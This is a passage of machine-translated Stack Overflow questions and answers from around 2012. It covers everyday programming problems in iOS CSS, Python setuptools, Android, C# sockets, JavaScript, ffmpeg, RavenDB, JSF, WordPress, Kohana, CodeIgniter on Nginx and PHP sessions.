> 赞同：6
> 
> 时间：2012-11-09T17:15:45.577

认为我已经解决了我的问题 - 它与顶部的元视口标签有关。我包括了 height=device-height ，这似乎可以解决问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T15:44:44.483

这里有一些有趣的技巧来解决这个问题

```
$('body').animate({scrollTop: window.screen.availHeight}, 1, function(){
        $('body').animate({scrollTop: "0px"}, 1);
    }) 
```

完美适用于任何固定元素的 iOS

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T09:55:27.667

这发生在`ios 5.11`(Running on iPhone 3Gs), `ios 6.12`(Running on iPhone4) , `ios 6.0.1` (Running on iPhone 5)。我的应用程序正在运行`Phonegap 2.3`。

这个问题不仅仅是`jQueryMobile`问题，而是一个 css 位置固定问题。（或其他体现在 css 问题上的东西）

“固定”页脚在第一个滚动条上开始移动。在此之后，页脚是固定的。并且每次弹出屏幕键盘并滚动内容时，页脚都会再次松动。

@VoVaVc 建议的答案修复了第一个滚动问题，但没有解决键盘打开滚动问题。为 Studio4 修复它的声明`height=device-height`对我的应用程序没有任何作用。

html:

```
 <div id="footernav">
            <div id="Button" class="navButton">
                <img class="naviImg" src="assets/icon.png">
                <span>###buttonTexts###</span>
            </div>
            <div id="secondButton" class="navButton">
                <img class="naviImg" src="assets/icon.png">
                <span>###buttonTexts###</span>
            </div>                
  </div> 
```

以及容器的 css

```
#footernav {
clear: both;
position: fixed !important;
left: 0;
bottom: 0;
width: 100%;
height: 9%;
-webkit-box-shadow:0 -3px 30px rgba(0, 0, 0, 0.65);
box-shadow:0 -3px 30px rgba(0, 0, 0, 0.65);
z-index: 9;
} 
```

编辑：

我用所有黑客之母解决了我的问题：

```
 $('.formularInputRecipient', this.el).on('focus',function() {
        console.log("HIDE");
        $("#footernav", this.el).hide();
    });

    $('.formularInputRecipient', this.el).on('blur',function() {
        console.log("show");
        $("#footernav", this.el).show();
    }); 
```

所以。键盘与固定页脚混淆。因此，当我获得屏幕键盘时（在我的情况下，单击文本输入字段）我隐藏了错误位置的页脚，当关闭键盘时，我再次显示它。

有时没有时间寻求适当的解决方案。

# python - console_scripts 入口点被忽略？

> ID：13271085
> 
> 赞同：2
> 
> 时间：2012-11-07T13:47:07.480
> 
> 标签：python, console, setuptools

我在 Windows 上使用 setuptools（版本 0.6c11），并指定要通过`console_scripts`入口点安装的控制台脚本。它在 Linux 上运行良好，但在 Windows 下，使用 MinGW 编译器，没有安装脚本。我在安装输出中没有看到任何相关消息。

其他软件包，如 ipython，运行良好，运行 .exe 文件后运行 .exe 文件 `setup.py install`。

有人可以建议一种调试方法吗？

```
import setuptools
setup(
   # ...
   entry_points={
      'console_scripts':[
          'myprog = myMod:main'
      ]
   }
) 
```

**更新：**

根据 Vinay 提出的示例（谢谢！），我能够隔离问题：如果模块安装在嵌套子目录中，则不会创建脚本：

```
import setuptools, os.path, shutil

SOURCE = '''
def main():
    print('Hello, world!')
'''

### ERROR: when level of subdir is > 1, script is not created
subdir='subdir/subdir2'

### OK: with single-level subdirectory, everything works just fine
# subdir='subdir'

def prepare():
    # remove previous source
    if os.path.exists('subdir'): shutil.rmtree('subdir')
    # create subdirs as necessary
    os.makedirs(subdir)
    with open(subdir+'/my_mod.py', 'w') as f: f.write(SOURCE)

prepare()

setuptools.setup(
    name = 'myprog',
    version = '0.1',
    url = 'http://dummy.com/',
    author = 'Me',
    author_email = 'me@dummy.com',
    py_modules=['my_mod'],
    package_dir={'':subdir},
    entry_points={
        'console_scripts':['myprog = my_mod:main']
   },
   zip_safe=False
) 
```

我误解了什么是`package_dir`为了？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-15T13:49:13.287

好吧，这对我有用：

```
# This file is setup.py
import setuptools

SOURCE = '''
def main():
    print('Hello, world!')
'''

def prepare():
    with open('my_mod.py', 'w') as f:
        f.write(SOURCE)

prepare()

setuptools.setup(
    name = 'woo',
    version = '0.1',
    url = 'http://dummy.com/',
    author = 'Me',
    author_email = 'me@dummy.com',
    py_modules=['my_mod'],
    entry_points={
        'console_scripts':['myprog = my_mod:main']
   }
) 
```

当我在 virtualenv 中运行它时：

```
(venv) C:\temp\exemplar>python setup.py install
running install
running bdist_egg
running egg_info
writing woo.egg-info\PKG-INFO
writing top-level names to woo.egg-info\top_level.txt
writing dependency_links to woo.egg-info\dependency_links.txt
writing entry points to woo.egg-info\entry_points.txt
reading manifest file 'woo.egg-info\SOURCES.txt'
writing manifest file 'woo.egg-info\SOURCES.txt'
installing library code to build\bdist.win32\egg
running install_lib
running build_py
creating build
creating build\lib
copying my_mod.py -> build\lib
creating build\bdist.win32
creating build\bdist.win32\egg
copying build\lib\my_mod.py -> build\bdist.win32\egg
byte-compiling build\bdist.win32\egg\my_mod.py to my_mod.pyc
creating build\bdist.win32\egg\EGG-INFO
copying woo.egg-info\PKG-INFO -> build\bdist.win32\egg\EGG-INFO
copying woo.egg-info\SOURCES.txt -> build\bdist.win32\egg\EGG-INFO
copying woo.egg-info\dependency_links.txt -> build\bdist.win32\egg\EGG-INFO
copying woo.egg-info\entry_points.txt -> build\bdist.win32\egg\EGG-INFO
copying woo.egg-info\top_level.txt -> build\bdist.win32\egg\EGG-INFO
zip_safe flag not set; analyzing archive contents...
creating 'dist\woo-0.1-py2.7.egg' and adding 'build\bdist.win32\egg' to it
removing 'build\bdist.win32\egg' (and everything under it)
Processing woo-0.1-py2.7.egg
creating c:\temp\venv\lib\site-packages\woo-0.1-py2.7.egg
Extracting woo-0.1-py2.7.egg to c:\temp\venv\lib\site-packages
Adding woo 0.1 to easy-install.pth file
Installing myprog-script.py script to C:\temp\venv\Scripts
Installing myprog.exe script to C:\temp\venv\Scripts

Installed c:\temp\venv\lib\site-packages\woo-0.1-py2.7.egg
Processing dependencies for woo==0.1
Finished processing dependencies for woo==0.1

(venv) C:\temp\exemplar>pip uninstall woo
Uninstalling woo:
  c:\temp\venv\lib\site-packages\woo-0.1-py2.7.egg
  c:\temp\venv\scripts\myprog-script.py
  c:\temp\venv\scripts\myprog.exe
Proceed (y/n)? y
  Successfully uninstalled woo

(venv) C:\temp\exemplar> 
```

**更新：**

您的问题是没有使用正确的路径分隔符：使用

子目录='子目录\\子目录2'

为我工作。当然，您可能应该使用`os.path.join()`.

# android - 复合 ListView 行的 StateList

> ID：13271088
> 
> 赞同：2
> 
> 时间：2012-11-07T13:47:19.040
> 
> 标签：android, listview, styles, selected, statelist

当我单击 ListView 中的一行时，该行正在使用 statelist，但单个元素不是。

1.  在图像、文本和图像上设置 duplicateParentState(true) 什么都不做。
2.  将单个项目设置为 clickable(true) 会将 statelist 更改应用于每个项目，但即使设置了 addChildStates() （方法名的近似值）也不会更改父项。

因此，我想单击 ListView 中的一行并更新各个项目的状态。显然遗漏了什么。

我在 ListView 中有以下行：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/list_row"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="horizontal"
    android:background="@drawable/statelist_row" >

    <FrameLayout
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_weight="0.1" >

        <ImageView
            android:id="@+id/product_image"
            style="@style/list_image"
            android:contentDescription="@string/product_image" />

        <ProgressBar
            android:id="@+id/product_image_progress"
            style="@style/list_image"
            android:visibility="gone" />
    </FrameLayout>

    <TextView
        android:id="@+id/product_name"
        style="@style/list_text"
        android:layout_weight="0.9"
        android:gravity="center_vertical" />

    <ImageView
        style="@style/list_caret"
        android:layout_weight="0.1"
        android:contentDescription="@string/caret" />

</LinearLayout> 
```

在适配器中，我使该行可点击：

```
 holder.productListRow.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            Toast.makeText(context, "CLICKED: '" + holder.productName.getText().toString() + "'", Toast.LENGTH_LONG).show();
        }
    }); 
```

我有一个应用于样式的状态列表：

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">

    <item android:drawable="@color/selected_item" android:state_pressed="true" android:textColor="@color/white" android:color="@color/white"/>
    <item android:drawable="@color/std_background" android:color="@color/black"/>

</selector> 
```

从颜色：

```
<color name="list_text_color">@drawable/statelist_produce_row</color> 
```

最后，从样式：

```
<style name="list_text" parent="fill_parent">
    <item name="android:textSize">@dimen/list_text_size</item>
    <item name="android:textColor">@color/list_text_color</item>
    <item name="android:layout_gravity">left|center_vertical</item>
    <item name="android:padding">@dimen/list_text_padding</item>
    <item name="android:textStyle">bold</item>
</style> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:44:02.810

您不应该通过为列表视图设置一个 onItemClickListener 来使列表视图项目可点击，而不是让每一行都可点击吗？

试试这个

```
mListView.setOnItemClickListener(new OnItemClickListener() {
@Override
public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
        ...
}        
}); 
```

或者如果你正在扩展 ListActivity，你可以直接实现 onListItemClick()：

```
@Override
protected void onListItemClick(ListView l, View v, int position, long id) {
    ...
} 
```

# c#-4.0 - 通过套接字发送二进制文件

> ID：13271097
> 
> 赞同：0
> 
> 时间：2012-11-07T13:47:32.000
> 
> 标签：c#-4.0

我一直在尝试通过 TCP 套接字发送一个二进制文件，我的文件长度是 5Mo 我收到的只有 1Mo，收到的文件包含很多丢失的部分，我不明白为什么，我试图拆分二进制文件进入 1Mo 的 5 部分，我发送了第一部分（1 Mo），收到的文件只有 255！请问有人可以解释为什么吗？有没有一种有效的方法来发送这种类型的文件？

这是我正在使用的代码，它包含三个部分：浏览二进制文件/打开套接字以发送文件/发送文件：

```
private void senduimage_Click(object sender, EventArgs e)

{
string inpath = "C:\\Documents and Settings\\Bureau\\uImage";
 FileStream fs = new FileStream(inpath, FileMode.Open, FileAccess.Read);  
if (!user.clientSocket_NewSocket.Connected)
{

Socket clientSocket_NewSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 user.clientSocket_NewSocket = clientSocket_NewSocket;
 try
  {
    System.IAsyncResult _NewSocket = user.clientSocket_NewSocket.BeginConnect(ip_address, NewSocket.Transceiver_TCP_Port, null, null);
    bool successNewSocket = _NewSocket.AsyncWaitHandle.WaitOne(2000, true);
  }
 byte[] buff = null;
 BinaryReader br = new BinaryReader(fs);
 string inpath = "C:\\Documents and Settings\\Bureau\\uImage"
 long numbytes = new FileInfo(inpath).Length;
 buff = br.ReadBytes((int)numbytes);
 user.clientSocket_NewSocket.Send(buff);
} 
```

}

欢迎任何帮助，谢谢:)

* * *

我已经尝试过您向我提出的发送到文件，但它给了我一个例外，说这个操作不能用未连接的套接字完成，这是我使用的代码：

```
01  private void senduimage_Click(object sender, EventArgs e)
02          {
03              
06             
07              if (!user.clientSocket_NewSocket.Connected)
08              {
09   
10                  Socket clientSocket_NewSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
11                  user.clientSocket_NewSocket = clientSocket_NewSocket;
12                   
13              }
14               
15              System.IAsyncResult _NewSocket = user.clientSocket_NewSocket.BeginConnect(ip_address, NewSocket.Transceiver_TCP_Port, null, null);
16              bool successNewSocket = _NewSocket.AsyncWaitHandle.WaitOne(2000, true);
17              if (successNewSocket)
18              {
19                  string fileName = "C:\\Documents and Settings\\Bureau\\uImage";
20                  user.clientSocket_NewSocket.SendFile(fileName);
21                  user.clientSocket_NewSocket.Shutdown(SocketShutdown.Both);
22                  user.clientSocket_NewSocket.Close();
23              } 
```

请问有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T13:02:41.857

您可以使用套接字的 SendFile() 方法，也可以尝试在 while 循环中发送数据。在 while 循环中发送一些数据，如 1KB 或类似的东西。

# javascript - Javascript 继承 - 从另一个原型调用函数

> ID：13271098
> 
> 赞同：0
> 
> 时间：2012-11-07T13:47:32.410
> 
> 标签：javascript, oop, inheritance, prototype

> **可能重复：**
> [Crockford 的原型继承 - 嵌套对象的问题](https://stackoverflow.com/questions/10131052/crockfords-prototypal-inheritance-issues-with-nested-objects)

我在获取以下代码以从原型 A 执行原型 B 中的函数时遇到问题，并且想知道是否有任何简单的解决方案：

```
var Ob = function () {
  test = 'hi';
}

Ob.prototype.A = {
  that : this,
  root : this,
  goB : function () {
    var that = this;

    console.log('hello');
    that.B.wtf();
  }
}

Ob.prototype.B = {
  that : this,
  root : this,
  wtf : function () {
    var that = this;

    console.log(that);
  }
}

test = new Ob;
test.A.goB(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T13:55:22.527

当您将对象字面量`A`和分配`B`给 的原型时`Ob`，您就是在原型上放置了两个带有一些方法的对象字面量。您没有将方法放在原型上。因此，当您在实例的上下文中对这些对象文字执行该方法时`test`，`this`并不意味着您认为它意味着什么。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T13:57:23.863

创建对象后，您需要连接属性：

```
var Ob = function () {
    var that = this;

    // set the current root to this instance and return the object
    this.getA = function() {
        that.A.currentRoot = that;
        return that.A;
    };

    this.getB = function() {
        that.B.currentRoot = that;
        return that.B;
    };
};

Ob.prototype.A = {
    goB : function () {
        var that = this.currentRoot;

        console.log('hello');
        that.getB().wtf();
    }
};

Ob.prototype.B = {
    wtf : function () {
        var that = this.currentRoot;

        console.log(that, this);
    }
};

test = new Ob;
test.getA().goB(); 
```

一个相当肮脏的技巧是在父对象中使用特权方法来扩充子对象并返回它，以便您可以通过属性访问父对象。肮脏的部分是，如果您缓存对象，则不能保证该属性具有正确的值。所以这或多或少是一种方法，尽管你真的不应该这样做。

# linux - ffmpeg 中无法识别的选项“-vf”

> ID：13271099
> 
> 赞同：2
> 
> 时间：2012-11-07T13:47:50.070
> 
> 标签：linux, ffmpeg, watermark

我正在运行这个命令

```
ffmpeg -i "video_in.mp4" -vf "movie=watermark.png [watermark]; [in][watermark] overlay=main_w/2-overlay_w/2:main_h/2-overlay_h/2 [out]" outputvideo.mp4 
```

也试过

```
/usr/local/bin/ffmpeg -i "video_in.mp4" -vf "movie=watermark.png [watermark]; [in][watermark] overlay=main_w/2-overlay_w/2:main_h/2-overlay_h/2 [out]" outputvideo.mp4 
```

**错误**：ffmpeg 中无法识别的选项“-vf”

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-07T14:57:14.707

你的 ffmpeg 版本太旧，至少需要 0.7 版本。

-vf 替换旧 ffmpeg 版本中使用的旧 -vhook 标志。libavfilter 工作于 2007 年作为 Google Summer of Code 项目开始，现在已集成到主线 ffmpeg 中。

见： http: [//ffmpeg.org/pipermail/ffmpeg-user/2011-July/001545.html](http://ffmpeg.org/pipermail/ffmpeg-user/2011-July/001545.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T13:58:03.877

您的错误是“-vf”对ffmpeg没有任何意义。我不确定您打算使用哪个选项（-f、-v、-vn），但请查看手册页以了解您的意图。

```
man ffmpeg 
```

这是手册页的链接：http: [//linux.die.net/man/1/ffmpeg](http://linux.die.net/man/1/ffmpeg)

# c# - WhereGreaterThan 在 LuceneQuery (RavenDB) 中不返回任何结果

> ID：13271106
> 
> 赞同：1
> 
> 时间：2012-11-07T13:48:26.433
> 
> 标签：c#, ravendb

我在使用 lucene 查询大于某个值的值时遇到问题。我的数据是动态的，所以 Linq 不是一个选项。

简而言之，问题是当我使用 WhereGreaterThan 进行查询时，即使我的 Asset.Data 的价格大于价值，我也得到零结果。这也适用于 WhereGreaterThanOrEquals、WhereLessThan 和 WhereLessThanOrEquals。

```
public class AssetDataSearch : AbstractIndexCreationTask<Asset>
{
    public AssetDataSearch()
    {
        Map = (docs) => 
            from d in docs
            select new
            {
                DataType = d.DataType,
                _ = d.SearchableParameters.Select(s => CreateField(s.Key, s.Value))
            };
    }
}

public class Test
{
    public void TestMethod()
    {
        var assets = new []
        {
            new Asset()
            {
                ID = Guid.NewGuid().ToString(),
                Data = new ListingData()
                {
                    Beds = 5,
                    Baths = 5,
                    ListingType = ListingTypeEnum.Condo,
                    Price = 100
                }
            },
            new Asset()
            {
                ID = Guid.NewGuid().ToString(),
                Data = new ListingData()
                {
                    LotSize = 55,
                    SqFeet = 89,
                    YearBuilt = 1965,
                    Price = 200
                }
            },
        };
        RavenHelper.InitTestingStore();
        using (var session = RavenDB.RavenUtility.OpenSession())
        {
            foreach(var a in assets)
                session.Store(a);
            session.SaveChanges();
            var assetsInDb = session.Advanced.LuceneQuery<Asset>().WaitForNonStaleResults().ToArray();
            var n = session.Advanced.LuceneQuery<Asset, AssetDataSearch>().WhereEquals("Price", 100).ToArray(); // returns expected results
            var gt = session.Advanced.LuceneQuery<Asset, AssetDataSearch>().WhereGreaterThan("Price", 60).ToArray(); // returns nothing
            var lt = session.Advanced.LuceneQuery<Asset, AssetDataSearch>().WhereLessThan("Price", 60).ToArray();  // returns nothing
        }
     }
 } 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T21:24:59.527

我在 Raven Google 小组中找到了答案。事实证明，我必须使用与数据相同的数据类型进行查询。因此，在这种情况下，由于“价格”是小数，我必须将 60M 传递给 where 子句：

```
var gt = session.Advanced.LuceneQuery<Asset, AssetDataSearch>().WhereGreaterThan("Price", 60M).ToArray(); 
```

# java - JSF 2.0。无法在 preRenderView 事件处理程序中获取 POST 参数和 cookie

> ID：13271113
> 
> 赞同：7
> 
> 时间：2012-11-07T13:48:35.697
> 
> 标签：java, jsf, jsf-2, prerender

我正在尝试开发一项服务。

关键是我的 index.xhtml 应该从 HTTP 请求中获取参数（POST 和 GET）和 cookie。

我尝试与`<f:metadata>`这样`<f:event type="preRenderView">`的组合：

```
<f:metadata>  
    <f:event type="preRenderView" listener="#{deConversation.start}"/>  
</f:metadata> 
```

deConversation.start 的代码：

```
public void start(ComponentSystemEvent event) {
    System.out.println("checkLogin");
    HttpServletRequest request = SsoHelper.getRequest();
    String requestSessId = SsoHelper.getRequestSessionId(request);
    String requestRedirect = SsoHelper.getRequestRedirect(request);

    System.out.println("sessId " + requestSessId);

    if (requestRedirect == null || requestRedirect.isEmpty()) {
        requestRedirect = "self";
    }

    if (requestSessId != null) {
        trySessId(requestSessId, requestRedirect);
    }

    externalResourcesHandler.setExternalRedirect(requestRedirect);
    tryToBeginConversation();

    if (!isAuthorized()) {
        SsoHelper.performNavigation("auth");
    }
} 
```

SsoHelper 只是提供这样的 api：

```
public static String getRequestSessionId(HttpServletRequest request) {
    Map<String, Object> cookieMap = FacesContext.getCurrentInstance().getExternalContext().getRequestCookieMap();
    String requestDeSessionId = null;
    if (cookieMap.containsKey("de_session_id")) {
        requestDeSessionId = ((Cookie) cookieMap.get("de_session_id")).getValue();
    }
    return requestDeSessionId;
}

public static String getRequestRedirect(HttpServletRequest request) {
    return getRequestParam(request, "redirect", "self");
}

public static String getRequestExternalCss(HttpServletRequest request) {
    return getRequestParam(request, "externalcss", null);
}

public static String getRequestParam(HttpServletRequest request, String name, String defaultValue) {
    String[] paramValues = HttpServletRequestHelper.getParamValues(request, name);
    String paramValue = null;
    if (paramValues != null && paramValues.length != 0) {
        paramValue = paramValues[0];
    }
    if(paramValue == null){
        paramValue = defaultValue;
    }
    return paramValue;
}

public static HttpServletRequest getRequest() {
    return (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
}

public static void performNavigation(String destination) {
    FacesContext context = FacesContext.getCurrentInstance();
    ConfigurableNavigationHandler handler = (ConfigurableNavigationHandler) context.getApplication().getNavigationHandler();
    handler.performNavigation(destination);
} 
```

关键是我无法在方法 start() 中获取任何 POST 参数或 cookie。我只能获取 GET 参数。

是否有可能使用读取 cookie 和 POST 参数`<f:event type="preRenderView">`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-09T06:44:24.520

我认为您应该使用 @PostConstruct 调用 init 方法，以便在页面呈现之前调用 init() 并获取全局变量以在变量中分配 Session 或 Cookies 值，这样您就可以满足您的要求。

例子：

```
@PostConstruct
public void init(){
    // Your Response
    Map request = (Map)FacesContext.getCurrentInstance().getExternalContext().getResponse();
    request.get("Your Key");

    // Cookies
    Map cookie = FacesContext.getCurrentInstance().getExternalContext().getRequestCookieMap();
    cookie.get("Your Key");

    Map session = FacesContext.getCurrentInstance().getExternalContext().getSessionMap();
    session.get("Your Key"); 
} 
```

试试这个，我想它会帮助你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-29T20:03:01.187

您还可以使用 f:viewParam 标记来获取 POST/GET 参数并将其绑定到支持 bean 的属性。

更准确地说，标签会导致 UIViewParameter 被附加为当前视图的元数据。假设您的 POST 参数名称是“mypostparam”，基本上您可以执行以下操作：

```
<f:metadata> 
    <f:viewParam id="mypostparam" name="mypostparam" value="#{deConversation.myPostParam}"/>
    <f:event type="preRenderView" listener="#{deConversation.start}"/>  
</f:metadata> 
```

在您的支持 bean 中，您应该声明属性 myPostParam 和标准的 setter/getter 方法。作为一个好处，您可以嵌套标准转换器和验证器，让 JSF 处理它。

唯一的限制是这在渲染响应阶段不起作用（您可以在通过返回字符串的操作方法导航时获取 POST 参数）。它将在作为 POST 提交目标的视图上工作。

# javascript - 为什么 JSLint 更喜欢点符号而不是方括号？

> ID：13271116
> 
> 赞同：15
> 
> 时间：2012-11-07T13:48:40.070
> 
> 标签：javascript, jquery, jslint

我一直在检查我的一些代码并收到一些错误，说最好使用点表示法。我发现我正在使用方括号表示法（[从这篇很棒的帖子中可以清楚](https://stackoverflow.com/questions/2001360/javascript-dot-notation)地看到），但是，我想问一下为什么 Crockford 更喜欢点表示法？我正在做的项目已经使用 SBN 了，我不认为它令人困惑或不可读，但如果用户 dot 有明显的原因，我会更正它。

只是想在继续之前完全理解它！

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-07T13:53:09.230

根据我对 Crockford 的最了解，我认为这归结为一致性和避免使用保留字。在他的[网站上](http://javascript.crockford.com/survey.html)，他说：

> 当下标是合法标识符形式的字符串常量时，可以使用点表示法。由于语言定义的错误，保留字不能用在点表示法中，但可以用在下标表示法中。

由于您可以在下标符号中引用保留字，因此可能会引起混淆。基本上，避免使用保留字作为对象成员的名称。点符号强制执行这一点（通过语言 - Crockford 称之为错误），因此避免使用保留字被认为是一种更好的编码实践。

同样在同一个网站上，他还表示点符号“更方便一点”。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-11-07T13:53:29.663

从“JavaScript：好的部分”[第 21 页](http://books.google.dk/books?id=PXa2bby0oQ0C&lpg=PA20&hl=da&pg=PA21#v=onepage&q&f=false)说：

> 这 。符号是首选，因为它更紧凑，读起来更好。

这本书是道格拉斯·克罗克福德自己写的。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-07T13:56:49.237

> 两种语法都没有问题，并且都可以在所有环境中使用。但是，通过尽可能使用点表示法，您每次可以保存三个字符。

[资源](http://jslinterrors.com/a-is-better-written-in-dot-notation/)

重要的是要记住 JSLint 标准完全基于意见。大多数通常是流行的观点，但有些是有争议的。话虽如此，我更喜欢[JSHint](http://www.jshint.com/)，它允许您关闭任何您不同意的选项。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-07T13:51:17.563

我相信这是为了将数组元素与对象属性区分开来，并减少混乱的代码。

例如：

```
var x = [];
x.push(stuff); 
```

这`x[0]`是我们访问它的方式。

```
var y = { foo: "bar" }; 
```

`y['foo']`和`y.foo`工作一样，但要清楚这`foo`是**对象 y 的属性**而**不是数组 y 中的元素**，我们可以对对象使用点表示法。

# wordpress - 如何在 Wordpress 中检查 if 类别 x 的子类别？

> ID：13271117
> 
> 赞同：2
> 
> 时间：2012-11-07T13:48:40.053
> 
> 标签：wordpress, categories

有没有办法可以使用条件检查页面是否是特定类别的子类别？

即：在我的“category.php”上，我目前有：

```
 <?php } else if (is_category( 'blog' )) { ?> 
```

这是为了根据用户所在的类别页面呈现不同的视图。

有可能做类似的事情吗？

```
 <?php } else if (is_sub_category_of( 'blog' )) { ?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2017-10-18T18:19:48.267

虽然很老，但我已经创建了完美的解决方案。

将此添加到您的`functions.php`文件中：

```
/** check if the current category is a child of a given category **/
function current_cat_is_sub_of($parent = ''){
    global $wp_query;
    $cat = $wp_query->get_queried_object();

    if ( ! isset( $wp_query ) ) {
        _doing_it_wrong( __FUNCTION__, __( 'Conditional query tags do not work before the query is run. Before then, they always return false.' ), '3.1.0' );
        return false;
    }
    elseif( $cat->parent!=0 && $cat->parent == $parent ){
        return true;
    }
    else{
        return false;
    }
} 
```

然后你可以通过各种方式使用它。例如更改给定类别下所有子类别页面中帖子的显示顺序：

```
/** order posts under category 123 from new to old **/
function order_digital_posts($query){
    if (current_cat_is_sub_of('THE PARENT CATEGORY ID') && $query->is_main_query()) {
        $query->set( 'order', 'ASC' );
    }
}
add_action('pre_get_posts', 'order_digital_posts'); 
```

享受！伊塔马尔

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-20T12:45:20.213

老问题，但我昨晚偶然发现了这个问题，我不得不为自己找到答案。

这是在我的`category.php`页面上：

```
$category = get_the_category();

if(isset($category[1]) && $category[1]->slug === 'catagory-you-want') {

    // Do stuff if it's a child of "Category You Want"
    // You can use $category[1]->cat_ID to check which category instead

} 
```

当前子类别`$category`位于位置`0`。

如果“您想要的类别”有一个父类别而您不知道，这将更加困难。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T13:51:28.470

您可以查看您当前的类别父 ID 是否与“博客”类别 ID 匹配。如果是这样，您当前的类别是“博客”的子类别。

```
$current_cat = get_query_var("category");
$cat = get_term_by('slug',$current_cat,"category");
$blog = get_term_by('slug',"blog","category");

if($cat->parent == $blog->ID){ /*your code */ } 
```

此代码将执行您描述的功能。

# php - Kohana 3.2 在执行“where like”时将 % 连接到变量

> ID：13271122
> 
> 赞同：0
> 
> 时间：2012-11-07T13:48:49.053
> 
> 标签：php, kohana, kohana-3

## 回答：

我觉得自己像一个完整的假人=（我没有意识到它在我的代码中的字符串末尾添加了一个空格。在我从字符串中删除空格之后，它一切正常。

很抱歉浪费了大家的时间=S

* * *

我遇到了一件奇怪的事情，这里有一个例子：

这将返回没有问题的正确结果。

```
ORM::factory('blog_post')->where('title', 'like', 'this is my 1 post%')->find(); 
```

然而，这根本不返回任何东西......

```
$post_title = 'this is my 1 post';
ORM::factory('blog_post')->where('title', 'like', $post_title.'%')->find(); 
```

这也不是，**即使所有 3 个示例中的文本都相同**

```
$post_title = 'this is my 1 post%';
ORM::factory('blog_post')->where('title', 'like', $post_title)->find(); 
```

关于为什么的任何想法？

非常感谢您的帮助 =)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:30:54.883

尝试`ORM::factory('blog_post')->where('title', 'like', '%'.$post_title.'%')->find();`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T14:04:47.100

以下语法必须有效。

```
ORM::Factory('foo')->where('bar' , 'like'  , '%'.$foobar.'%')->find(); 
```

如果它不起作用，请转储您的变量并检查生成的 SQL。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T20:05:23.950

试试 ORM::factory('blog_post')->load(null,null)->where('title', 'like', $post_title)->find();

# php - Nginx 上的 Codeigniter 为表单生成 https 操作，但不是 Apache

> ID：13271137
> 
> 赞同：2
> 
> 时间：2012-11-07T13:49:49.827
> 
> 标签：php, apache, codeigniter, https, nginx

我有一个带有登录表单的 Codeigniter 应用程序。我在 Apache 和 Nginx 上都运行了它。在 Apache 上，一切正常，表单操作也正常。但是在 Nginx 上，表单操作使用`https`而不是`http`（我目前不想要）。

我使用这个生成表单：

```
<?php echo form_open(site_url('/user/do_login')); ?> 
```

它产生了这个：

```
<form action="https://example.com/index.php/user/do_login" method="post" accept-charset="utf-8"> 
```

如何强制它生成`http`而不是`https`在 Nginx 上生成？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-07T15:22:44.287

假设您正在使用自动 site_url 检测，Codeigniter 自己的 http/https 检测依赖于该[`$_SERVER['HTTPS']`值，`off`](https://github.com/bcit-ci/CodeIgniter/blob/v2.1.0/system/core/Config.php#L71)如果它实际上设置为某个值，`http`则为 base_url 生成。

检查您的默认 fastcgi_params （通常`/etc/nginx/fastcgi_params`），也许它将其设置为空字符串或“关闭”以外的其他内容，您也可以从 nginx 配置强制它为“关闭”：

```
fastcgi_param  HTTPS off; 
```

如果您`server`在 nginx 的配置文件中对 http 和 https 连接使用一个块，则可以使用[映射](http://nginx.org/en/docs/http/ngx_http_map_module.html)来根据`$scheme`变量创建所需的值：

```
# somewhere inside http { ... }
map $scheme $php_https { default off; https on; } 
```

并在中引用它`fastcgi_param`：

```
fastcgi_param  HTTPS $php_https; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T15:26:02.483

检查 Nginx 框与 Apache 框上的 config.php。site_url 返回您在 config.php 的 $config['base_url'] 条目中指定的内容

# php - 保持用户登录的最佳方法？

> ID：13271139
> 
> 赞同：0
> 
> 时间：2012-11-07T13:50:06.490
> 
> 标签：php, cookies

我想知道在我的应用程序中主要是 php，这是保持用户登录到站点直到他们注销的最佳方法。可以是令牌、会话寿命、cookie 等吗？

目前这是我的登录和注销系统的工作方式：

当用户登录时，它会将他们的详细信息存储在 $_SESSION 中：

```
if (isset($_SESSION['teacherid'])) {

      $userid = $_SESSION['teacherid'];

  }

if (isset($_SESSION['teacherusername'])) {

      $username = $_SESSION['teacherusername'];

  } 
```

然后在每个脚本中，它包含下面的代码，其中 sessionlife 持续 12 小时：

```
<?php

ini_set('session.gc_maxlifetime',12*60*60);
ini_set('session.gc_divisor', '1');
ini_set('session.gc_probability', '1');
